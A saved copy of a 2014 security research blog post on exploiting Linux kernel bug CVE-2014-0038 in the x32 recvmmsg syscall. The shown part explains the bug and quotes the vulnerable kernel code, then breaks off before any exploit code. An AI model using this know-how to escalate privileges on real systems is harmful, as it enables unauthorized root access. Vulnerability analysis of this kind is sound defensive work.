<!DOCTYPE html>
<!-- saved from url=(0108)https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/ -->
<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">

	<!-- This site is optimized with the Yoast SEO plugin v17.7.1 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038 - Include Security Research Blog</title>
	<link rel="canonical" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/">
	<meta property="og:locale" content="en_US">
	<meta property="og:type" content="article">
	<meta property="og:title" content="How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038 - Include Security Research Blog">
	<meta property="og:description" content="On January 31st 2014 a post appeared on oss-seclist [1] describing a bug in the Linux kernel implementation of the x32 recvmmsg syscall that could potentially lead to privilege escalation. It didn’t take long until the first exploits appeared, in this blog post we’ll walk-through the vulnerability and Samuel’s Proof-of-concept exploit in detail. The Vulnerable ... Read more">
	<meta property="og:url" content="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/">
	<meta property="og:site_name" content="Include Security Research Blog">
	<meta property="article:published_time" content="2014-03-06T20:25:00+00:00">
	<meta property="article:modified_time" content="2021-02-17T20:17:01+00:00">
	<meta name="twitter:card" content="summary_large_image">
	<meta name="twitter:creator" content="@includesecurity">
	<meta name="twitter:site" content="@includesecurity">
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="IncludeSec">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="14 minutes">
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://blog.includesecurity.com/#organization","name":"Include Security","url":"https://blog.includesecurity.com/","sameAs":["https://www.linkedin.com/company/include-security-llc","https://www.youtube.com/user/IncludeSecurity","https://twitter.com/includesecurity"],"logo":{"@type":"ImageObject","@id":"https://blog.includesecurity.com/#logo","inLanguage":"en-US","url":"https://i2.wp.com/blog.includesecurity.com/wp-content/uploads/2021/02/includesec.png?fit=151%2C151&ssl=1","contentUrl":"https://i2.wp.com/blog.includesecurity.com/wp-content/uploads/2021/02/includesec.png?fit=151%2C151&ssl=1","width":151,"height":151,"caption":"Include Security"},"image":{"@id":"https://blog.includesecurity.com/#logo"}},{"@type":"WebSite","@id":"https://blog.includesecurity.com/#website","url":"https://blog.includesecurity.com/","name":"Include Security Research Blog","description":"Team Research blog","publisher":{"@id":"https://blog.includesecurity.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://blog.includesecurity.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#webpage","url":"https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/","name":"How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038 - Include Security Research Blog","isPartOf":{"@id":"https://blog.includesecurity.com/#website"},"datePublished":"2014-03-06T20:25:00+00:00","dateModified":"2021-02-17T20:17:01+00:00","breadcrumb":{"@id":"https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/"]}]},{"@type":"BreadcrumbList","@id":"https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://blog.includesecurity.com/"},{"@type":"ListItem","position":2,"name":"How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038"}]},{"@type":"Article","@id":"https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#article","isPartOf":{"@id":"https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#webpage"},"author":{"@id":"https://blog.includesecurity.com/#/schema/person/57d4885372e70cdd2a6580c2b5b576b3"},"headline":"How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038","datePublished":"2014-03-06T20:25:00+00:00","dateModified":"2021-02-17T20:17:01+00:00","mainEntityOfPage":{"@id":"https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#webpage"},"wordCount":2271,"commentCount":2,"publisher":{"@id":"https://blog.includesecurity.com/#organization"},"articleSection":["Exploit","Kernel Exploit","Linux","privilege escalation","recvmmsg"],"inLanguage":"en-US","potentialAction":[{"@type":"CommentAction","name":"Comment","target":["https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#respond"]}]},{"@type":"Person","@id":"https://blog.includesecurity.com/#/schema/person/57d4885372e70cdd2a6580c2b5b576b3","name":"IncludeSec","image":{"@type":"ImageObject","@id":"https://blog.includesecurity.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/c5332f443fa9b0340ef65a0360b974fa?s=96&d=identicon&r=g","contentUrl":"https://secure.gravatar.com/avatar/c5332f443fa9b0340ef65a0360b974fa?s=96&d=identicon&r=g","caption":"IncludeSec"},"description":"Hackin'","url":"https://blog.includesecurity.com/author/includesecsite/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="dns-prefetch" href="https://secure.gravatar.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
<link rel="dns-prefetch" href="https://widgets.wp.com/">
<link rel="dns-prefetch" href="https://s0.wp.com/">
<link rel="dns-prefetch" href="https://0.gravatar.com/">
<link rel="dns-prefetch" href="https://1.gravatar.com/">
<link rel="dns-prefetch" href="https://2.gravatar.com/">
<link rel="dns-prefetch" href="https://jetpack.wordpress.com/">
<link rel="dns-prefetch" href="https://s1.wp.com/">
<link rel="dns-prefetch" href="https://s2.wp.com/">
<link rel="dns-prefetch" href="https://public-api.wordpress.com/">
<link rel="dns-prefetch" href="https://i0.wp.com/">
<link rel="dns-prefetch" href="https://i1.wp.com/">
<link rel="dns-prefetch" href="https://i2.wp.com/">
<link rel="dns-prefetch" href="https://c0.wp.com/">
<link rel="alternate" type="application/rss+xml" title="Include Security Research Blog » Feed" href="https://blog.includesecurity.com/feed/">
<link rel="alternate" type="application/rss+xml" title="Include Security Research Blog » Comments Feed" href="https://blog.includesecurity.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Include Security Research Blog » How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038 Comments Feed" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/feed/">
		<script>
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.includesecurity.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.2"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/wp-emoji-release.min.js.下載" type="text/javascript" defer=""></script>
		<style>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="wp-block-library-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/style.min.css" media="all">
<style id="wp-block-library-inline-css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="mediaelement-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/mediaelementplayer-legacy.min.css" media="all">
<link rel="stylesheet" id="wp-mediaelement-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/wp-mediaelement.min.css" media="all">
<link rel="stylesheet" id="generate-comments-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/comments.min.css" media="all">
<link rel="stylesheet" id="generate-style-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/main.min.css" media="all">
<style id="generate-style-inline-css">
body{background-color:#ffffff;color:#222222;}a{color:#1e73be;}a:hover, a:focus, a:active{color:#000000;}.wp-block-group__inner-container{max-width:1200px;margin-left:auto;margin-right:auto;}.site-header .header-image{width:270px;}body, button, input, select, textarea{font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";}body{line-height:1.5;}.entry-content > [class*="wp-block-"]:not(:last-child){margin-bottom:1.5em;}.main-navigation .main-nav ul ul li a{font-size:14px;}.sidebar .widget, .footer-widgets .widget{font-size:17px;}h1{line-height:1em;}h2{line-height:1em;}h3{line-height:1em;}@media (max-width:768px){h1{font-size:31px;}h2{font-size:27px;}h3{font-size:24px;}h4{font-size:22px;}h5{font-size:19px;}}.top-bar{background-color:#636363;color:#ffffff;}.top-bar a{color:#ffffff;}.top-bar a:hover{color:#303030;}.site-header{background-color:#ffffff;}.main-title a,.main-title a:hover{color:#222222;}.site-description{color:#757575;}.mobile-menu-control-wrapper .menu-toggle,.mobile-menu-control-wrapper .menu-toggle:hover,.mobile-menu-control-wrapper .menu-toggle:focus,.has-inline-mobile-toggle #site-navigation.toggled{background-color:rgba(0, 0, 0, 0.02);}.main-navigation,.main-navigation ul ul{background-color:#ffffff;}.main-navigation .main-nav ul li a,.menu-toggle, .main-navigation .menu-bar-items{color:#515151;}.main-navigation .main-nav ul li:hover > a,.main-navigation .main-nav ul li:focus > a, .main-navigation .main-nav ul li.sfHover > a, .main-navigation .menu-bar-item:hover > a, .main-navigation .menu-bar-item.sfHover > a{color:#7a8896;background-color:#ffffff;}button.menu-toggle:hover,button.menu-toggle:focus{color:#515151;}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:#7a8896;background-color:#ffffff;}.main-navigation .main-nav ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul li[class*="current-menu-"].sfHover > a{color:#7a8896;background-color:#ffffff;}.navigation-search input[type="search"],.navigation-search input[type="search"]:active, .navigation-search input[type="search"]:focus, .main-navigation .main-nav ul li.search-item.active > a, .main-navigation .menu-bar-items .search-item.active > a{color:#7a8896;background-color:#ffffff;}.main-navigation ul ul{background-color:#eaeaea;}.main-navigation .main-nav ul ul li a{color:#515151;}.main-navigation .main-nav ul ul li:hover > a,.main-navigation .main-nav ul ul li:focus > a,.main-navigation .main-nav ul ul li.sfHover > a{color:#7a8896;background-color:#eaeaea;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a{color:#7a8896;background-color:#eaeaea;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul ul li[class*="current-menu-"].sfHover > a{color:#7a8896;background-color:#eaeaea;}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:#ffffff;}.entry-title a{color:#1b1f35;}.entry-title a:hover{color:#55555e;}.entry-meta{color:#595959;}.sidebar .widget{background-color:#ffffff;}.footer-widgets{background-color:#ffffff;}.footer-widgets .widget-title{color:#000000;}.site-info{color:#ffffff;background-color:#55555e;}.site-info a{color:#ffffff;}.site-info a:hover{color:#d3d3d3;}.footer-bar .widget_nav_menu .current-menu-item a{color:#d3d3d3;}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],input[type="tel"],input[type="number"],textarea,select{color:#666666;background-color:#fafafa;border-color:#cccccc;}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="number"]:focus,textarea:focus,select:focus{color:#666666;background-color:#ffffff;border-color:#bfbfbf;}button,html input[type="button"],input[type="reset"],input[type="submit"],a.button,a.wp-block-button__link:not(.has-background){color:#ffffff;background-color:#55555e;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,a.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,a.button:focus,a.wp-block-button__link:not(.has-background):active,a.wp-block-button__link:not(.has-background):focus,a.wp-block-button__link:not(.has-background):hover{color:#ffffff;background-color:#3f4047;}a.generate-back-to-top{background-color:rgba( 0,0,0,0.4 );color:#ffffff;}a.generate-back-to-top:hover,a.generate-back-to-top:focus{background-color:rgba( 0,0,0,0.6 );color:#ffffff;}@media (max-width:768px){.main-navigation .menu-bar-item:hover > a, .main-navigation .menu-bar-item.sfHover > a{background:none;color:#515151;}}.nav-below-header .main-navigation .inside-navigation.grid-container, .nav-above-header .main-navigation .inside-navigation.grid-container{padding:0px 20px 0px 20px;}.separate-containers .paging-navigation{padding-top:20px;padding-bottom:20px;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-40px;width:calc(100% + 80px);max-width:calc(100% + 80px);}.rtl .menu-item-has-children .dropdown-menu-toggle{padding-left:20px;}.rtl .main-navigation .main-nav ul li.menu-item-has-children > a{padding-right:20px;}@media (max-width:768px){.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content, .inside-page-header, .wp-block-group__inner-container{padding:30px;}.inside-top-bar{padding-right:30px;padding-left:30px;}.inside-header{padding-right:30px;padding-left:30px;}.widget-area .widget{padding-top:30px;padding-right:30px;padding-bottom:30px;padding-left:30px;}.footer-widgets-container{padding-top:30px;padding-right:30px;padding-bottom:30px;padding-left:30px;}.inside-site-info{padding-right:30px;padding-left:30px;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-30px;width:calc(100% + 60px);max-width:calc(100% + 60px);}.one-container .site-main .paging-navigation{margin-bottom:20px;}}/* End cached CSS */.is-right-sidebar{width:30%;}.is-left-sidebar{width:30%;}.site-content .content-area{width:100%;}@media (max-width:768px){.main-navigation .menu-toggle,.sidebar-nav-mobile:not(#sticky-placeholder){display:block;}.main-navigation ul,.gen-sidebar-nav,.main-navigation:not(.slideout-navigation):not(.toggled) .main-nav > ul,.has-inline-mobile-toggle #site-navigation .inside-navigation > *:not(.navigation-search):not(.main-nav){display:none;}.nav-align-right .inside-navigation,.nav-align-center .inside-navigation{justify-content:space-between;}}
</style>
<link rel="stylesheet" id="enlighterjs-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/enlighterjs.min.css" media="all">
<link rel="stylesheet" id="social-logos-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/social-logos.min.css" media="all">
<link rel="stylesheet" id="jetpack_css-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/jetpack.css" media="all">
<link rel="https://api.w.org/" href="https://blog.includesecurity.com/wp-json/"><link rel="alternate" type="application/json" href="https://blog.includesecurity.com/wp-json/wp/v2/posts/189"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.includesecurity.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.includesecurity.com/wp-includes/wlwmanifest.xml"> 

<link rel="shortlink" href="https://wp.me/p9RwVC-33">
<link rel="alternate" type="application/json+oembed" href="https://blog.includesecurity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.includesecurity.com%2F2014%2F03%2Fhow-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038%2F">
<link rel="alternate" type="text/xml+oembed" href="https://blog.includesecurity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.includesecurity.com%2F2014%2F03%2Fhow-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038%2F&amp;format=xml">
<style type="text/css">img#wpstats{display:none}</style>
		<link rel="pingback" href="https://blog.includesecurity.com/xmlrpc.php">
<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="amphtml" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/amp/"><link rel="icon" href="https://blog.includesecurity.com/wp-content/uploads/2021/02/favicon.ico" sizes="32x32">
<link rel="icon" href="https://blog.includesecurity.com/wp-content/uploads/2021/02/favicon.ico" sizes="192x192">
<link rel="apple-touch-icon" href="https://blog.includesecurity.com/wp-content/uploads/2021/02/favicon.ico">
<meta name="msapplication-TileImage" content="https://blog.includesecurity.com/wp-content/uploads/2021/02/favicon.ico">
<style type="text/css" id="wp-custom-css">#page,#content,#primary,#main {
	max-width: 960px;
}
.site-header {
	background: #1b1f35;
	color: #fff;  
	margin-bottom: 0px;
}
.site-description {
	color: #9ed54d;
	font-variant: small-caps;
	text-transform: lowercase;
	font-size:2em;
	height:100%;
	vertical-align:bottom;
	line-height: 0.7em;
}
.main-title {
	color: #fff;
}
.main-navigation {
	padding: 0px;
	margin: 0px;
	line-height: 10px;
}
.main-navigation .main-nav ul li a, 
.main-navigation .menu-toggle {
	color: #1b1f35;
	font-weight: bold;
}


.comment { display: none; }</style><!-- Your Google Analytics Plugin is missing the tracking ID -->
<link rel="stylesheet" type="text/css" id="gravatar-card-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/hovercard.min.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/services.min.css"></head>

<body class="post-template-default single single-post postid-189 single-format-standard wp-custom-logo wp-embed-responsive no-sidebar nav-below-header separate-containers header-aligned-center dropdown-hover" itemtype="https://schema.org/Blog" itemscope="">
	<a class="screen-reader-text skip-link" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#content" title="Skip to content">Skip to content</a>		<header id="masthead" class="site-header" itemtype="https://schema.org/WPHeader" itemscope="">
			<div class="inside-header grid-container">
				<div class="site-branding-container"><div class="site-logo">
					<a href="https://blog.includesecurity.com/" title="Include Security Research Blog" rel="home">
						<img class="header-image is-logo-image" alt="Include Security Research Blog" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/logo.svg" title="Include Security Research Blog">
					</a>
				</div><div class="site-branding">
						
						<p class="site-description" itemprop="description">
					Team Research blog
				</p>
					</div></div>			</div>
		</header>
				<nav id="site-navigation" class="main-navigation nav-align-center sub-menu-right" itemtype="https://schema.org/SiteNavigationElement" itemscope="">
			<div class="inside-navigation grid-container">
								<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
					<span class="gp-icon icon-menu-bars"><svg viewBox="0 0 512 512" aria-hidden="true" role="img" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1em" height="1em">
						<path d="M0 96c0-13.255 10.745-24 24-24h464c13.255 0 24 10.745 24 24s-10.745 24-24 24H24c-13.255 0-24-10.745-24-24zm0 160c0-13.255 10.745-24 24-24h464c13.255 0 24 10.745 24 24s-10.745 24-24 24H24c-13.255 0-24-10.745-24-24zm0 160c0-13.255 10.745-24 24-24h464c13.255 0 24 10.745 24 24s-10.745 24-24 24H24c-13.255 0-24-10.745-24-24z"></path>
					</svg><svg viewBox="0 0 512 512" aria-hidden="true" role="img" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1em" height="1em">
						<path d="M71.029 71.029c9.373-9.372 24.569-9.372 33.942 0L256 222.059l151.029-151.03c9.373-9.372 24.569-9.372 33.942 0 9.372 9.373 9.372 24.569 0 33.942L289.941 256l151.03 151.029c9.372 9.373 9.372 24.569 0 33.942-9.373 9.372-24.569 9.372-33.942 0L256 289.941l-151.029 151.03c-9.373 9.372-24.569 9.372-33.942 0-9.372-9.373-9.372-24.569 0-33.942L222.059 256 71.029 104.971c-9.372-9.373-9.372-24.569 0-33.942z"></path>
					</svg></span><span class="mobile-menu">Menu</span>				</button>
				<div id="primary-menu" class="main-nav"><ul id="menu-primary" class=" menu sf-menu"><li id="menu-item-57" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-57"><a href="https://includesecurity.com/#home">Home</a></li>
<li id="menu-item-61" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-61"><a href="https://includesecurity.com/#careers">Careers</a></li>
<li id="menu-item-62" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-62"><a href="https://includesecurity.com/#contact">Contact Us</a></li>
<li id="menu-item-428" class="twitterIcon menu-item menu-item-type-custom menu-item-object-custom menu-item-428"><a href="https://twitter.com/includesecurity">Twitter</a></li>
</ul></div>			</div>
		</nav>
		
	<div id="page" class="site grid-container container hfeed">
				<div id="content" class="site-content">
			
	<div id="primary" class="content-area">
		<main id="main" class="site-main">
			
<article id="post-189" class="post-189 post type-post status-publish format-standard hentry category-exploit category-kernel-exploit category-linux category-privilege-escalation category-recvmmsg" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div class="inside-article">
					<header class="entry-header">
				<h1 class="entry-title" itemprop="headline">How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038</h1>		<div class="entry-meta">
			<span class="posted-on"><time class="updated" datetime="2021-02-17T15:17:01-05:00" itemprop="dateModified">February 17, 2021</time><time class="entry-date published" datetime="2014-03-06T15:25:00-05:00" itemprop="datePublished">March 6, 2014</time></span> <span class="byline"> — <span class="author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope=""><span class="author-name" itemprop="name">IncludeSec</span></span></span> 		</div>
					</header>
			
		<div class="entry-content" itemprop="text">
			<p>On January 31st 2014 a post appeared on oss-seclist [1] describing a bug in the Linux kernel implementation of the x32 recvmmsg syscall that could potentially lead to privilege escalation. It didn’t take long until the first exploits appeared, in this blog post we’ll walk-through the vulnerability and Samuel’s Proof-of-concept exploit in detail.</p>
<h2>The Vulnerable Linux Kernel Code</h2>
<p>The bug is located in the x32 version of the recvmmsg syscall in the Linux kernel. The recvmmsg syscall allows for receiving multiple messages on a socket with just one syscall (and can thus increase performance in certain situations).</p>
<p>To be clear the x32 ABI (not to be confused with the X86 ABI) is a particular ABI and that is not enabled by default on all distributions. However, recent Ubuntu-based distributions as well as Arch Linux ones have enabled it. For more details on the x32 ABI refer to [2]. In short x32 is an ABI which takes advantage of the 64-bit environment while using 32bit pointers for less overhead. However, the x32 system calls can also be accessed by standard 64bit applications by setting adding the value of __X32_SYSCALL_BIT to 64bit system call numbers.</p>
<p>The CVE 2014-0038 bug is a fairly classic case of trusting user supplied input. The timeout pointer in the function below is passed directly from user space to __sys_recvmmsg, which expects a trusted pointer, without first copying the value of the user supplied pointer to a controlled kernel space variable.<br>
The following is the code which handles the recvmmsg syscall for the x32 ABI (net/compat.c):</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">asmlinkage long </span><span class="enlighter-m0">compat_sys_recvmmsg</span><span class="enlighter-g1">(</span><span class="enlighter-text">int fd, struct compat_mmsghdr __user *mmsg,</span></div></div><div class=""><div><span class="enlighter-text">                                    unsigned int vlen, unsigned int flags,</span></div></div><div class=""><div><span class="enlighter-text">                                    struct compat_timespec __user *timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        int datagrams;</span></div></div><div class=""><div><span class="enlighter-text">        struct timespec ktspec;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">flags </span><span class="enlighter-g0">&amp;</span><span class="enlighter-text"> MSG_CMSG_COMPAT</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k1">return</span><span class="enlighter-text"> -EINVAL;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">COMPAT_USE_64BIT_TIME</span><span class="enlighter-g1">)</span><span class="enlighter-text">      </span><span class="enlighter-c1">/* set when doing the x32 syscall, the x32 ABI uses 64bit time values */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k1">return</span><span class="enlighter-text"> </span><span class="enlighter-m0">__sys_recvmmsg</span><span class="enlighter-g1">(</span><span class="enlighter-text">fd, </span><span class="enlighter-g1">(</span><span class="enlighter-text">struct mmsghdr __user *</span><span class="enlighter-g1">)</span><span class="enlighter-text">mmsg, vlen,</span></div></div><div class=""><div><span class="enlighter-text">                                      flags </span><span class="enlighter-g0">|</span><span class="enlighter-text"> MSG_CMSG_COMPAT,</span></div></div><div class=""><div><span class="enlighter-text">                                      </span><span class="enlighter-g1">(</span><span class="enlighter-text">struct timespec *</span><span class="enlighter-g1">)</span><span class="enlighter-text"> timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c1">/* ... */</span></div></div></div><div class="enlighter-raw">asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,
                                    unsigned int vlen, unsigned int flags,
                                    struct compat_timespec __user *timeout)
{
        int datagrams;
        struct timespec ktspec;

        if (flags &amp; MSG_CMSG_COMPAT)
                return -EINVAL;

        if (COMPAT_USE_64BIT_TIME)      /* set when doing the x32 syscall, the x32 ABI uses 64bit time values */
                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
                                      flags | MSG_CMSG_COMPAT,
                                      (struct timespec *) timeout);
/* ... */</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,
                                    unsigned int vlen, unsigned int flags,
                                    struct compat_timespec __user *timeout)
{
        int datagrams;
        struct timespec ktspec;

        if (flags &amp; MSG_CMSG_COMPAT)
                return -EINVAL;

        if (COMPAT_USE_64BIT_TIME)      /* set when doing the x32 syscall, the x32 ABI uses 64bit time values */
                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
                                      flags | MSG_CMSG_COMPAT,
                                      (struct timespec *) timeout);
/* ... */</pre>
<p>Pointers passed from user space are marked with the __user attribute to make sure they are only accessed through the user space API functions (e.g. copy_to_user, copy_from_user, …). In this case though, the timeout parameter is cast directly to a type not containing the __user attribute, and then passed on to __sys_recvmmsg without any further checks on it.<br>
